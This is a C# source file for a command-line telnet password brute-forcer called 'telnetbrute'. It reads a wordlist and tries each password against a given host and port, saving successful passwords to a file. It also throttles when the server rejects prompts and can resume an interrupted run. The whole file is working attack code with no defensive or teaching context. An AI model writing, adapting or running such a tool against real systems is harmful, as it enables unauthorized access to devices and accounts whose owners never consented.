using System;
using System.IO;
using MinimalisticTelnet;

namespace telnetbrute
{
	class MainClass
	{
		public static void Main (string[] args)
		{
			StreamWriter writer = null;
			Console.CancelKeyPress += (sender, eventArgs) => {
				eventArgs.Cancel = false;
				writer.Close();
				Console.WriteLine("shutting down");
			};

			if (args.Length < 3) {
				showUsage ();
			}
				
			string passwordpath = args[2];
			string host = args [0];
			int port = int.Parse(args [1]);
			writer = new StreamWriter ("passwords.found.txt");
			bool shouldRead = true;
			string password = null;

			using (StreamReader reader = new StreamReader (passwordpath)) {
				bool doingResume = false;
				string lastPass = null;
				if (args.Length == 4) {
					doingResume = true;
					lastPass = resume (args [3], reader);
				}

				while (reader.BaseStream.CanRead) {
					if (shouldRead) {
						if (doingResume) {
							doingResume = false;
							password = lastPass;
						} else {
							password = reader.ReadLine ();
						}
					}

					try {
						shouldRead = true;
						TelnetConnection tc = new TelnetConnection(host,port);
						Console.WriteLine("Try:" + password);
						tc.Login(null,password,250);

						if(tc.IsConnected){
							writer.WriteLine(password);
							Console.WriteLine("****DING DING " + password);
						}
					
					} catch (Exception e) {
						shouldRead = false;
						Console.WriteLine (e.Message);
						if (e.Message == "Failed to connect : no password prompt") {
							System.Threading.Thread.Sleep (30000);
						}
					}

				}
				reader.Close ();
			}
			writer.Close ();
		}

		private static string resume(string lastPass,StreamReader reader){
			while (reader.BaseStream.CanRead) {
				string currentPassword = reader.ReadLine ();
				if (currentPassword == lastPass) {
					return lastPass;
				}
			}
			return "";
		}

		private static void showUsage(){
			Console.WriteLine ("telnetbrute host port passwordpath (optional)lastpassword");
		}
	}
}
